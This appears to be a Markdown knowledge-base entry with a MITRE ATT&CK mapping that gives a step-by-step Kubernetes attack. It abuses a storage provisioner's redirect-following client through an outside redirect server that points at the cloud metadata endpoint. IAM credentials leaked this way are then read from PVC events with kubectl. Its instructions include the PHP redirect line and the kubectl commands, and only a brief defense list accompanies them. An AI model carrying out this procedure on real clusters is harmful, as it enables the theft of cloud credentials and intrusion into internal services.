---
id: proc-k8s-retrieve-responses
tags:
  - ssrf
  - redirect
  - events
  - credential-theft
type: procedure
tools:
  - '[[tools/kubectl]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/kubectl-describe-pvc]]'
  - '[[commands/kubectl-get-events]]'
verified: false
platforms:
  - Kubernetes
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unsecured Credentials]]'
updated_at: '2025-12-14T04:08:54.838Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Unsecured Credentials]]'
---
---

# Retrieve-Internal-Responses-via-Redirects-and-Events

## Summary

This procedure uses 302 redirects to proxy internal requests and extracts leaked responses from Kubernetes events or PVC status, enabling data exfiltration like metadata credentials.

## Description

The Golang net/http client follows redirects, converting POST to GET for internal URLs. Responses (if JSON and non-200) leak into provisioning events, visible via kubectl. Targets include AWS metadata (169.254.169.254) or Kubelet (10255).

## Requirements

1. Control over redirect server (e.g., PHP script returning 302 to internal URL)
2. Updated StorageClass/PVC with redirect resturl
3. Access to cluster events

## Defense

Defensive measures and detection strategies:

- Disable redirect following in provisioner clients
- Scrub sensitive data from events and logs
- Monitor for anomalous event patterns

## Objectives

1. Proxy requests to internal services
2. Leak responses via events
3. Exfiltrate credentials or service data

## Instructions

### Step 1: Set Up Redirect

**Context**: Modify resturl to 'http://bzh.ovh/redirect.php#' where redirect.php does header('Location: http://169.254.169.254/latest/meta-data/'); http_response_code(302);

**Command** ([[commands/kubectl-create-yaml]]):
```bash
kubectl apply -f updated-sc-pvc.yaml
```

> Triggers new provisioning with redirect.

### Step 2: Query Events for Leaks

**Context**: Describe PVC or get events to see leaked JSON.

**Command** ([[commands/kubectl-describe-pvc]]):
```bash
kubectl describe pvc poc-pvc
```

> Expected output: Events section with JSON from internal response, e.g., IAM role credentials.

**Command** ([[commands/kubectl-get-events]]):
```bash
kubectl get events --sort-by='.lastTimestamp'
```

> Expected output: Provisioning failure events containing response body.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Unsecured Credentials]]

### Sub-Techniques


## Commands Used

- [[commands/kubectl-describe-pvc]]
- [[commands/kubectl-get-events]]

## Tools Used

- [[tools/kubectl]]

## Tags

- ssrf
- redirect
- events
- credential-theft

---
